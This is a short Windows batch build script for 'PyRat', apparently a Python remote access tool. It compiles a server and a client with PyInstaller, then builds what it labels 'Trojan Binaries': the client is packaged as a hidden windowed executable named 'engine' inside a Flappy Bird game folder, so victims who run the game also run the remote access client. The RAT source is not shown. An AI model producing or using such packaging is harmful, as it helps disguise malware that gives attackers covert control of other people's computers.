@echo off
title PyRat Build Script
echo.
echo Building CLI Binaries...
pyinstaller server.py -F -y -i assets/icons/shell.ico --distpath "dist/PyRat" --name "PyRatServer"
pyinstaller client.py -F -y -i assets/icons/gear.ico --distpath "dist/PyRat" --name "PyRatClient"
echo.
echo Building Trojan Binaries...
pyinstaller client.py -F -y -i assets/icons/gear.ico --distpath "dist/FlappyBird" --name "engine" --windowed
pyinstaller flappy.py -F -y -i assets/icons/flappy.ico --distpath "dist/FlappyBird" --name "flappybird" --windowed
echo.
echo Copying Assets...
xcopy "assets" "dist/FlappyBird/assets" /E /S /Y
echo.
echo DONE!